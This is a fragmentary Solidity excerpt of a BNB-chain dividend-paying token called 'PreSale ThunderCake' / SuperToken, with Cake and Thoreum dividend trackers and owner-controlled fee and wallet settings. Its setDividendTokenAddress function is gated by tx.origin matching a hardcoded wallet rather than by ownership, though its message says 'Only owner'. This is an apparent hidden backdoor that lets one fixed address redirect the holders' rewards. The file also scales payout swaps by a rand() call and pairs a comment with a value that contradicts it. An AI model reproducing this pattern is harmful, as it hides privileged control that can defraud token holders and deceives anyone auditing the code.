...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0xF68ECA313CFc9EAad74fbDCf8e70721d44b0fd0b, "Only owner can change dividend contract address");
...
contract SuperToken is ERC20, Ownable {
    ...
    constructor() ERC20("PreSale ThunderCake", "PSTHUNDERCAKE") {
    ...
    function updateTeamWallet(address _newWallet) external onlyOwner {
        require(_newWallet != teamWallet, "SuperToken: The team wallet is already this address");
    ...
    function updateMarketingWallet(address _newWallet) external onlyOwner {
        require(_newWallet != marketingWallet, "SuperToken: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function setThoreumDividendEnabled(bool _enabled) external onlyOwner {
        require(thoreumDividendEnabled != _enabled, "Can't set flag to same status");
        if (_enabled == false) {
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "SuperToken: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "SuperToken: The new dividend tracker must be owned by the SuperToken token contract");
    ...
    function updateThoreumDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(thoreumDividendTracker), "SuperToken: The dividend tracker already has that address");

        ThoreumDividendTracker newThoreumDividendTracker = ThoreumDividendTracker(payable(newAddress));

        require(newThoreumDividendTracker.owner() == address(this), "SuperToken: The new dividend tracker must be owned by the SuperToken token contract");
    ...
    function updateCakeDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "SuperToken: Fee too high");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "SuperToken: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "SuperToken: Account is already excluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "SuperToken: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "SuperToken: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "SuperToken: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "SuperToken: Trading has not started yet");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (cakeDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(cakeDividendRewardsFee.add(thoreumDividendRewardsFee)).mul(cakeDividendRewardsFee);
                    swapAndSendCakeDividends(sellTokens.div(10**2).mul(rand()));
                }

                if (thoreumDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(cakeDividendRewardsFee.add(thoreumDividendRewardsFee)).mul(thoreumDividendRewardsFee);
                    swapAndSendThoreumDividends(sellTokens.div(10**2).mul(rand()));
                }
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("SuperToken_Cake_Dividend_Tracker", "SuperToken_Cake_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "SuperToken_Cake_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "SuperToken_Cake_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SuperToken contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "SuperToken_Cake_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SuperToken_Cake_Dividend_Tracker: Cannot update claimWait to same value");
...
contract ThoreumDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("SuperToken_Thoreum_Dividend_Tracker", "SuperToken_Thoreum_Dividend_Tracker", 0x580dE58c1BD593A43DaDcF0A739d504621817c05) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "SuperToken_Thoreum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "SuperToken_Thoreum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SuperToken contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "SuperToken_Thoreum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SuperToken_Thoreum_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
